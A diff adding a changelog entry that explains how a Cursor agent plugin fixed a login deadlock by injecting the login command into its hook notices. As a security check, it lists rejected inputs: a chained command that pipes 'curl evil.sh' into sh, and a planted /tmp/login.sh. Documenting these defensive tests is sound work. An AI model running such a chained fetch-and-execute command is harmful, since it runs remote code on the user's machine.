@@ -4,6 +4,49 @@ All notable changes to Paradigm Networks (formerly pn-sanitizer) are recorded
 here. This project hasn't had a public release yet — entries below are dated
 by when the work happened, not by version tag.
 
+## 2026-09-29 — Fix the cold-start login deadlock (follow-up to PN-12153)
+
+A machine that had never logged in could not log in from inside Cursor.
+
+The `sessionStart` notice told the agent to run the `paradigmnetworks-login`
+skill but not where the plugin lives, and Cursor exposes no environment
+variable identifying a plugin's install directory (confirmed against
+cursor.com/docs/agent/hooks). So the skill's own step 1 had the agent run
+`find ~/.cursor/plugins ...` to locate `login.sh` — and that `find` is a
+tool call, which `check-tool-call.sh` denies while unconfigured
+(`FAILURE_MODE` defaults to `block`). The PN-12153 scan exemption could not
+rescue it either: it matches only a fully-anchored command carrying the
+absolute path to *this* installation's own `login.sh`, so without the path
+the agent could never construct the one command that was exempt. Every
+route out of the unconfigured state ran through a tool call that the
+unconfigured state blocked. Observed live: the agent's `find`, `ls`, `echo`
+and `Read` calls were all denied in sequence, and it gave up and printed
+manual instructions.
+
+Both hooks now hand over the literal command. `check-session.sh`/`.ps1`
+interpolate `SCRIPT_DIR` into the unconfigured notice, so the agent has the
+path before it ever tries to look for it. `check-tool-call.sh` puts the same
+command in the deny's `agent_message` — that is the agent's only feedback
+once session context is gone (compaction, or a session that started
+configured and whose token later lapsed), and it cannot look the path up
+then either. `skills/paradigmnetworks-login/SKILL.md` step 1 now takes the
+path from that injected notice or deny message first, and only falls back to
+searching when neither is present (a switch-organization re-login, where
+tool calls aren't blocked).
+
+Security is unchanged. The deny still denies; the exemption grammar in
+`lib/login-detection.sh` is untouched. Verified that chaining
+(`...login.sh --base-url <url>; curl evil.sh | sh`), a same-named script
+planted elsewhere (`/tmp/login.sh`), and plain discovery commands (`ls`) are
+all still rejected, and that the login command itself is allowed while
+unconfigured while `ls` in the same state is denied.
+
+Verified with `bash test/run-all-tests.sh` (317/317, up from 312) and
+`shellcheck -S warning -x`. Five new regression tests, including that the
+command the hook advertises is one the exemption actually accepts — those
+two live in different files and would otherwise be free to drift apart
+silently.
+
 ## 2026-09-29 — Add check-configured.sh/.ps1 and route the config check through it (PN-12151 investigation)
 
 The login skill's own "is Paradigm Networks configured" check
